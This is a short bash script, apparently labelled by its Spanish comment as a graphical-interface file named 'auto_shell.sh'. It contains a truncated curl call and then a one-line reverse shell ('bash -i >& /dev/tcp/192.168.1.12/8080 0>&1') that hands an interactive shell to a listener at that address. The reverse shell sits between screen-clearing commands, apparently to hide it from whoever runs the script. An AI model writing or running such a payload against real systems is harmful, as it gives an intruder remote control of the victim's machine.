#!/bin/bash

curl http..... #archivo interfaz grafica "auto_shell.sh"
clear
bash -i >& /dev/tcp/192.168.1.12/8080 0>&1
clear
